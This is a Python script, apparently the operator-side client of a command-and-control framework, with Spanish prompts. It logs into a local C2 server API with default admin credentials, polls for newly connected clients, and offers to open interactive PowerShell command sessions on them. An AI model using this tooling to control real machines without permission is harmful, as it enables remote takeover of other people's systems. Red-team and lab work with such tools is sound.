import requests
import subprocess
import urllib3
import json
import threading
import time

proxies = {
	'http' : 'http://127.0.0.1:8080',
	'https' : 'http://127.0.0.1:8080'
}
creds = {
	'username' : 'admin',
	'password' : 'admin'
}

URL = "https://127.0.0.1:8443"

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def iniciaTransportC2():
	args = ["bash", "base/modules/c2localclient/transportc2init.sh"]
	subprocess.Popen(args)

def si_o_no(question):
    while "Respuesta invalida.":
        reply = str(input(question+' (s/n): ')).lower().strip()
        if reply[:1] == 's':
            return True
        if reply[:1] == 'n':
            return False

def abrirSesionInteractiva(idsess, tipo):
	subprocess.Popen(['terminator', '--new-tab', '-x', 'python3', 'base/modules/c2localclient/c2clientelocalcmd.py', str(idsess), str(tipo)])
	#subprocess.system("python3 c2clientelocalcmd.py {} {}".format(idsess,tipo))

def getClientes(sesion):
	threading.Timer(5, getClientes, [sesion]).start()
	global sesiones_activas
	com = remoto.get(URL+"/api/client")
	json_data = com.text
	json_respuesta = json.loads(json_data)
	s = len(json_respuesta)
	if s > sesiones_activas:
		print("Nuevo cliente conectado:")
		print(json_respuesta[s-1])
		if si_o_no("Deseas abrir una sesion de comandos interactiva con el nuevo cliente?"):
			abrirSesionInteractiva(json_respuesta[s-1]["ID"], "ps1")
		#json_formateado = json.dumps(json_respuesta, indent=2)
		#print(json_formateado)
		sesiones_activas = sesiones_activas + 1

sesiones_activas = 0

try:
	#iniciaTransportC2()
	with requests.Session() as remoto:
		#remoto.proxies = proxies
		remoto.verify = False
		com = remoto.get(URL)
		print("Conexion inicializada\t\t[{}]".format(com.status_code))
		com = remoto.post(URL+"/login", data=creds)
		print("Esperando conexiones")
		while sesiones_activas == 0:
			com = remoto.get(URL+"/api/client")
			json_data = com.text
			json_respuesta = json.loads(json_data)
			sesiones_activas = len(json_respuesta)
			if sesiones_activas > 0:
				#json_formateado = json.dumps(json_respuesta, indent=2)
				#print(json_formateado)
				print("Nuevo cliente conectado:")
				print(json_respuesta)
				if si_o_no("Deseas abrir una sesion de comandos interactiva con el nuevo cliente?"):
					abrirSesionInteractiva(json_respuesta[0]["ID"], "ps1")
			time.sleep(5)
		getClientes(remoto)

except requests.exceptions.ConnectionError as e:
	raise e
